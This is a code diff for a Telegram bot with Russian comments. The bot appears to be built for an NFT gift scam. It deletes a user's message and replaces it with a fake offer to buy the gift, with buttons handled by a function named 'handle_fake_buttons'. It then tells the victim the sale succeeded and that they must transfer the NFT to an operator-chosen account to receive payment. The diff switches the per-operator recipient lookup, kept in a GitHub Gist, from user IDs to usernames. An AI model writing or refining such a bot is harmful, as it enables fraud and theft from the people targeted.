@@ -13,7 +13,7 @@ from aiogram.exceptions import TelegramBadRequest
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 GIST_ID = os.getenv("GIST_ID")
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID", 0)) # Твой ID из секретов
+ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
 
 DEFAULT_TARGET = "Gifts_Replayer"
 
@@ -31,11 +31,6 @@ MESSAGES = {
         "btn_decline": "Отклонить",
         "btn_transfer": "Передать NFT"
     },
-    # ... (остальные языки такие же, я пропущу для краткости, они есть в полном коде ниже)
-}
-
-# Добавим остальные языки для полноты
-MESSAGES.update({
     "en": {
         "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
         "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/{target_username}'>@{target_username}</a> to receive stars.",
@@ -60,7 +55,7 @@ MESSAGES.update({
         "btn_decline": "رفض",
         "btn_transfer": "نقل NFT"
     }
-})
+}
 
 def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
@@ -92,7 +87,7 @@ async def update_gist_data(new_data: dict):
         async with session.patch(url, headers=headers, json=payload) as resp:
             return resp.status == 200
 
-# --- АДМИН ПАНЕЛЬ ---
+# --- АДМИН ПАНЕЛЬ (РАБОТА ПО ЮЗЕРНЕЙМУ) ---
 @dp.message(Command("set_target"))
 async def cmd_set_target(message: types.Message):
     if message.from_user.id != ADMIN_ID:
@@ -100,16 +95,18 @@ async def cmd_set_target(message: types.Message):
     
     parts = message.text.split()
     if len(parts) != 3:
-        await message.answer("❌ Формат: `/set_target <ID_пользователя> <юзернейм_без_@>`")
+        await message.answer("❌ Формат: `/set_target @юзернейм новый_получатель`\nПример: `/set_target @shame1337 Nagve`")
         return
     
-    user_id, new_target = parts[1], parts[2].replace("@", "")
+    # Очищаем от @ и приводим к нижнему регистру для надежности
+    user_key = parts[1].replace("@", "").lower()
+    new_target = parts[2].replace("@", "")
     
     data = await get_gist_data()
-    data[user_id] = new_target
+    data[user_key] = new_target
     
     if await update_gist_data(data):
-        await message.answer(f"✅ Для пользователя `{user_id}` установлен новый получатель: `@{new_target}`")
+        await message.answer(f"✅ Для пользователя `@{user_key}` установлен новый получатель: `@{new_target}`")
     else:
         await message.answer("❌ Ошибка сохранения в GitHub Gist.")
 
@@ -120,16 +117,16 @@ async def cmd_remove_target(message: types.Message):
     
     parts = message.text.split()
     if len(parts) != 2:
-        await message.answer("❌ Формат: `/remove_target <ID_пользователя>`")
+        await message.answer("❌ Формат: `/remove_target @юзернейм`")
         return
     
-    user_id = parts[1]
+    user_key = parts[1].replace("@", "").lower()
     data = await get_gist_data()
     
-    if user_id in data:
-        del data[user_id]
+    if user_key in data:
+        del data[user_key]
         if await update_gist_data(data):
-            await message.answer(f"✅ Для пользователя `{user_id}` сброшен на стандартный @{DEFAULT_TARGET}")
+            await message.answer(f"✅ Для `@{user_key}` сброшен на стандартный @{DEFAULT_TARGET}")
     else:
         await message.answer("❌ Пользователь не найден в базе.")
 
@@ -193,14 +190,17 @@ async def handle_offer_command(message: types.Message):
         target_username=DEFAULT_TARGET
     )
 
+    # Берем юзернейм автора оффера для базы данных
+    sender_username = message.from_user.username.lower() if message.from_user.username else "no_username"
+
     try:
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
-        # В call_back_data передаем ID владельца бизнес-аккаунта, чтобы потом узнать его настройки
-        sender_id = message.from_user.id if message.from_user else message.sender_chat.id
+        
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}:{sender_id}"),
-            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}:{sender_id}")
+            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}"),
+            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}")
         ]])
+        
         await bot.send_message(
             chat_id=message.chat.id,
             text=caption_text,
@@ -218,13 +218,13 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
     
     data_parts = callback.data.split(":")
-    action, gift_slug, amount, currency, lang, sender_id = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4], data_parts[5]
+    action, gift_slug, amount, currency, lang, sender_username = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4], data_parts[5]
     
     symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
     
-    # Получаем кастомный юзернейм для этого пользователя из Gist
+    # Получаем кастомный юзернейм для этого пользователя из Gist по его username
     data = await get_gist_data()
-    target_username = data.get(sender_id, DEFAULT_TARGET)
+    target_username = data.get(sender_username, DEFAULT_TARGET)
 
     cache_buster = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
     link = f"https://t.me/nft/{gift_slug}?v={cache_buster}"
